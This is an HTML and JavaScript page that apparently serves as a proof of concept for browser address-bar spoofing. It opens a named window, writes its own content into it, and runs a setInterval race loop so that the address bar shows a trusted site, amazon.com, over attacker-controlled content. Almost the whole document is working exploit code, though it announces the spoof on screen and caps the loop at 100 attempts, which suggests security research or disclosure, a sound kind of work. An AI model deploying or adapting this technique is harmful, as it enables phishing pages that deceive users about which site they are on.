<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <a href="javascript:window.open('https://www.amazon.com:8080/','x');" onclick="startSpoof()">Spoof</a>
    <div id="status"></div>
</body>
    
<script>
let windowSpoof;
let raceInterval;
let attemptCount = 0;
const maxAttempts = 100; // Batasan 100x percobaan

function race() {
  attemptCount++;
  
  try {
    windowSpoof.location.href !== 'about:blank';
  }
  catch (e) {
    windowSpoof.location.href = 'https://www.google.com/csi';
  }
  
  // Stop setelah 100 percobaan
  if (attemptCount >= maxAttempts) {
    stopSpoof();
  }
}

function stopSpoof() {
  if (raceInterval) {
    clearInterval(raceInterval);
    raceInterval = null;
  }
  document.getElementById('status').textContent = 'Race condition stopped after ' + attemptCount + ' attempts';
  console.log('Race condition stopped after', attemptCount, 'attempts');
}

function startSpoof() {
  attemptCount = 0;
  document.getElementById('status').textContent = '';
  
  windowSpoof = window.open("https://www.google.com:82", "x");
  windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
  
  raceInterval = setInterval(race, 0);
}
</script>
